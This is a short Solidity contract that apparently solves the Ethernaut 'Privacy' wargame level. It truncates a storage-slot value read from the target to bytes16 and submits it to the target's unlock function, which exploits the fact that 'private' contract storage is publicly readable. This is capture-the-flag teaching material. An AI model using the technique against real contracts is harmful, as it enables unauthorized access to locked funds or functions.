// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPrivacy {
    function unlock(bytes16) external;
}

contract Solution {
    IPrivacy target;
    // create a reference to the original Ethernaut contract instance
    constructor(address _targetAddy) public {
        target = IPrivacy(_targetAddy);
    }

    function unlock(bytes32 _slotValue) public {
        // now we can submit the payload to the original instance
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}